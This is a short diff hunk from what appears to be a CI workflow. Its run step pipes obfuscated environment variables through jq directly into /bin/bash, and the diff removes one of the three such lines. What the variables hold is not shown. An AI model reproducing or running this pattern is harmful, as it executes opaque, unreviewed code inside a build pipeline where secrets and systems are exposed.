@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$sx5" | jq -r .xupk1100 | /bin/bash
           echo $s20 | jq -r .pymye2 | /bin/bash
-          printf '%s' "$sgsbi71011" | jq -r .pxjo4 | /bin/bash
 
       - name: Archive output
         if: always()
